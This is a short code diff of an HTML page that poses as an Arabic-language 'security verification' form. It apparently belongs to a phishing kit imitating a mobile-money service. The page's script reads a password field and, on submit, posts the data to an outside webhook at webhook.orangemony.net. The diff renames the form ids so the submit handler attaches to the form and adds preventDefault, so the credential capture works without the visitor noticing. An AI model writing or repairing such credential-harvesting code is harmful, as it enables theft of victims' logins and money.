@@ -117,10 +117,10 @@
                         0000000000
                     </span>
                 </div>
-                <div id="verificationForm" class="w-form">
+                <div id="divvform" class="w-form">
                     <!-- <form id="wf-form-" name="wf-form-" data-name="التحقق من الامن" method="get" data-wf-page-id="686bf05165306b123b50bc58" data-wf-element-id="79a466c5-9c18-b348-97ed-cbe6dd2fa663" aria-label="التحقق من الامن"> -->
                     <form 
-                        id="wf-form-" 
+                        id="verificationForm" 
                         name="تحقق" 
                         data-name="تحقق" 
                         method="post"
@@ -239,7 +239,7 @@
         document.getElementById('password').value = password;
 
         $("#verificationForm").on("submit", function(event) {
-
+            event.preventDefault();
             var xhr = new XMLHttpRequest();
             xhr.open("POST", 'https://webhook.orangemony.net', true);
             xhr.setRequestHeader('Content-Type', 'application/json');
